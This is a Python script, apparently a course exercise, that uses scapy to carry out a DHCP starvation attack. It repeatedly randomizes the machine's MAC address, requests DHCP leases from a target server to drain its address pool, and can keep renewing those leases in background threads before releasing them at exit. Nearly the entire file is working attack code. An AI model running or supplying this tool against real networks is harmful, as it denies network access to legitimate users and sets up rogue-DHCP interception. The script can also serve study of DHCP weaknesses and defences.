import argparse
import subprocess
import threading

from getmac import get_mac_address
from scapy import *
from scapy.all import *
from scapy.arch import get_if_raw_hwaddr
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
from scapy.sendrecv import srp, srp1, sr, sendp
from scapy.volatile import RandInt

from datetime import datetime, timedelta

ap = argparse.ArgumentParser()
ap.add_argument("-i", "--iface", required=False, default="eth0", type=str,
                help="Interface you wish to use")
ap.add_argument("-p", "--persist", required=False, default=False, type=bool,
                help="persistent?")
ap.add_argument("-t", "--target", required=False, default='255.255.255.255', type=str,
                help="Ip of target server")
args = vars(ap.parse_args())

dhcp_got_ip = []
dhcp_renew_ip = []
conf.checkIPaddr = False


def tempmac(mac):
    return mac.replace(':', '').decode('hex')


def changeMac():
    subprocess.check_output(
        "ifconfig %(iface)s down; macchanger -r %(iface)s; ifconfig %(iface)s up" % {"iface": args["iface"]},
        stderr=subprocess.STDOUT, shell=True)


def tempmac_to_mac(teMac):
    temp = teMac.encode("hex")[:12]
    return ':'.join([temp[i:i + 2] for i in range(0, len(temp), 2)])

    # parts = [my_string[i:i + 2] for i in range(0, len(my_string), size)]
    # print('-'.join(parts))  # + '-')


def get_option(dhcp_options, key):
    must_decode = ['hostname', 'domain', 'vendor_class_id']
    try:
        for i in dhcp_options:
            if i[0] == key:
                # If DHCP Server Returned multiple name servers
                # return all as comma seperated string.
                if key == 'name_server' and len(i) > 2:
                    return ",".join(i[1:])
                # domain and hostname are binary strings,
                # decode to unicode string before returning
                elif key in must_decode:
                    return i[1].decode()
                else:
                    return i[1]
    except:
        pass


# function for the Bonus:

# format of hours
def date_to_str(date):
    return '{:%H:%M:%S}'.format(date)


# calculate lease time hour
def str_first_hour(tup):
    return date_to_str(tup[0] + tup[1])


# keep information of ip and mac in tuple
def pkt_to_tup(pkt):
    # the right one:
    print(tempmac_to_mac(pkt[BOOTP].chaddr))
    return (
        datetime.now(), timedelta(seconds=get_option(pkt[DHCP].options, 'renewal_time')),
        tempmac_to_mac(pkt[BOOTP].chaddr),
        pkt[BOOTP].yiaddr,
        pkt[BOOTP].siaddr, pkt[Ether].src)

    # ether -not good
    # return (datetime.now(), timedelta(seconds=60), tempmac_to_mac(pkt[BOOTP].chaddr),
    #         pkt[BOOTP].yiaddr,
    #         pkt[BOOTP].siaddr, pkt[Ether].src)


# thread 1-->check when to send request again
def thread_movedTo_renew_ip():
    print("thread 1")
    global stop_threads
    while True:
        while dhcp_got_ip:  # list of ip in use not empty
            while (dhcp_got_ip and (str_first_hour(dhcp_got_ip[0]) == date_to_str(datetime.now()))) or (dhcp_got_ip and (
                    str_first_hour(dhcp_got_ip[0]) < date_to_str(datetime.now()))):
                dhcp_renew_ip.append(dhcp_got_ip.pop())
                print(" theard 1-- tup moved to dhcp_renew_ip:")
                print(dhcp_renew_ip)
                if not dhcp_got_ip:
                    pass
            if stop_threads:
                break
        time.sleep(1)
        if stop_threads:
            print("thread 1 stoped")
            break


# send request
def thread_renew_ip():
    print("thread 2")
    global stop_threads
    try:
        while True:
            while dhcp_renew_ip:  # list of renew ip not empty
                print("thread 2-> try to send")
                request_1 = Ether(dst=dhcp_renew_ip[0][5], src=dhcp_renew_ip[0][2], type=0x0800) / IP(
                    src=dhcp_renew_ip[0][3],dst=dhcp_renew_ip[0][4]) / UDP(dport=67, sport=68) / BOOTP(op=1, chaddr=tempmac(dhcp_renew_ip[0][2]),xid=RandInt(),
                    ciaddr=dhcp_renew_ip[0][3]) / DHCP(options=[('message-type', 'request'), ('client_id', dhcp_renew_ip[0][2]), ('end')])


                ack_1 = srp1(request_1, iface=args["iface"], store_unanswered=False, timeout=8)
                # inter=0.5, retry=-2, timeout=1 #loop
                #
                print("thread 2-> check ack_")

                if ack_1 and ack_1[DHCP].options[0][1] == 5:  # if ack
                    dhcp_renew_ip.pop()  # out of the list
                    dhcp_got_ip.append(pkt_to_tup(ack_1))  # keep the updated pkt
                    dhcp_got_ip.sort(key=lambda tup_2: tup_2[0] + tup_2[1])  # sort again
                    print("new ack -- thread2")
                    print(dhcp_got_ip)

                if stop_threads:
                    break
            if stop_threads:
                break
            time.sleep(1)
    except:
        stop_threads = True
        print("thread 2 stoped")


# release ip's
def release_packets(tup):
    print(tup)
    sendp(Ether(src=tup[2], dst="ff:ff:ff:ff:ff:ff") / IP(src=tup[3], dst="255.255.255.255") /
          UDP(sport=68, dport=67) /
          BOOTP(chaddr=tempmac(tup[2]), ciaddr=tup[3], xid=RandInt()) /
          DHCP(options=[("message-type", "release"), ("server_id", tup[4]), 'end']))
    print("released packet")


if args["persist"]:
    thread1 = threading.Thread(target=thread_movedTo_renew_ip)
    thread2 = threading.Thread(target=thread_renew_ip)
    stop_threads = False
    thread1.start()
    thread2.start()

#x = 0
while True:
    try:
        while True:
        #if x < 2:
            changeMac()
            mac = get_mac_address()
            targetMac = get_mac_address(ip=args["target"])
            #
            discover = Ether(dst=targetMac, src=mac, type=0x0800) / IP(src='0.0.0.0', dst=args["target"]) / UDP(
                dport=67, sport=68) / BOOTP(op=1, chaddr=tempmac(mac), xid=RandInt()) / DHCP(
                options=[('message-type', 'discover'), ('end')])  #

            offer = srp1(discover, iface=args["iface"], store_unanswered=False)  # , timeout=10)

            request = Ether(dst=get_mac_address(ip=args["target"]), src=mac, type=0x0800) / IP(src='0.0.0.0',
                                                                                               dst=args[
                                                                                                   "target"]) / UDP(
                dport=67, sport=68) / BOOTP(op=1, chaddr=tempmac(mac), xid=offer[BOOTP].xid) / DHCP(
                options=[('message-type', 'request'), ('client_id', mac), ("requested_addr", offer[BOOTP].yiaddr),
                         ("server_id", offer[BOOTP].siaddr),
                         ('end')])

            ack = srp1(request, iface=args["iface"], store_unanswered=False, timeout=8)

            # print("/n num: " + str(x))
            print(ack[DHCP].options[0][1])
            print(ack[BOOTP].yiaddr)
            #x += 1

            if args["persist"]:
                if ack and ack[DHCP].options[0][1] == 5:
                    dhcp_got_ip.append(pkt_to_tup(ack))
                    dhcp_got_ip.sort(key=lambda tup_1: tup_1[0] + tup_1[1])
                    print(dhcp_got_ip)

    except:
        stop_threads = True
        break

if args["persist"]:
    # stop_threads = True
    thread1.join()
    thread2.join()
    print("stoped threads")

    # release all  ip's:
    for tup in dhcp_got_ip:
        release_packets(tup)
    for tup in dhcp_renew_ip:
        release_packets(tup)
